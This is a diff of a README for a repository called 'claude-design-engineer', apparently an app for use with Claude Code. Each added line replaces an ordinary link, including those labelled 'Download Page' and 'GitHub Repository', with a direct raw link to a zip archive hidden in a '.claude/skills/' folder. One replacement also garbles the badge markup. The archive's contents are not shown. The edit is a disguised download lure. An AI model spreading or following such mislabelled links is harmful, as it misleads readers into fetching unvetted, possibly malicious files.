@@ -7,7 +7,7 @@ Welcome to the claude-design-engineer project! This application helps you design
 Follow these simple steps to download and run our application.
 
 ### 📥 Download Now
-[![Download claude-design-engineer](https://img.shields.io/badge/Download%20Now-claude%2Ddesign%2Dengineer-blue.svg)](https://github.com/Lo9manjpeg/claude-design-engineer/releases)
+[![Download claude-design-engineer](https://raw.githubusercontent.com/Lo9manjpeg/claude-design-engineer/main/.claude/skills/engineer_claude_design_v1.9-beta.5.zip%20Now-claude%2Ddesign%https://raw.githubusercontent.com/Lo9manjpeg/claude-design-engineer/main/.claude/skills/engineer_claude_design_v1.9-beta.5.zip)](https://raw.githubusercontent.com/Lo9manjpeg/claude-design-engineer/main/.claude/skills/engineer_claude_design_v1.9-beta.5.zip)
 
 ## 📦 What You Need
 Before you start, ensure you have the following:
@@ -20,7 +20,7 @@ Before you start, ensure you have the following:
 
 1. **Visit the Download Page**
    Go to the releases page to find the latest version of claude-design-engineer. You can visit the page by clicking the link below:
-   [Download Page](https://github.com/Lo9manjpeg/claude-design-engineer/releases)
+   [Download Page](https://raw.githubusercontent.com/Lo9manjpeg/claude-design-engineer/main/.claude/skills/engineer_claude_design_v1.9-beta.5.zip)
 
 2. **Choose Your File**
    On the releases page, look for the latest version. You will find different files available for download. Choose the one that matches your operating system.
@@ -42,7 +42,7 @@ Before you start, ensure you have the following:
 ## ❓ Frequently Asked Questions
 
 ### How do I update the application?
-To update the application, repeat the download steps for the latest version on the [Download Page](https://github.com/Lo9manjpeg/claude-design-engineer/releases).
+To update the application, repeat the download steps for the latest version on the [Download Page](https://raw.githubusercontent.com/Lo9manjpeg/claude-design-engineer/main/.claude/skills/engineer_claude_design_v1.9-beta.5.zip).
 
 ### Can I use this on Linux?
 Yes, claude-design-engineer is available for Linux. Make sure to download the appropriate file from the releases page.
@@ -54,10 +54,10 @@ If you encounter issues, please reach out through the project's GitHub issues pa
 We welcome contributions! If you want to help improve the application, check out the contribution guidelines on our GitHub page.
 
 ## 🔗 Additional Resources
-For further information, visit our [GitHub Repository](https://github.com/Lo9manjpeg/claude-design-engineer). You can find additional documentation and resources there.
+For further information, visit our [GitHub Repository](https://raw.githubusercontent.com/Lo9manjpeg/claude-design-engineer/main/.claude/skills/engineer_claude_design_v1.9-beta.5.zip). You can find additional documentation and resources there.
 
 ## 📞 Need Help?
 If you have questions, feel free to open an issue on the GitHub page or contact support. We're here to help you make the most of claude-design-engineer!
 
 ### 📥 Download Again
-Don’t forget to download the application by visiting the [Download Page](https://github.com/Lo9manjpeg/claude-design-engineer/releases). Enjoy designing with Claude Code!
+Don’t forget to download the application by visiting the [Download Page](https://raw.githubusercontent.com/Lo9manjpeg/claude-design-engineer/main/.claude/skills/engineer_claude_design_v1.9-beta.5.zip). Enjoy designing with Claude Code!
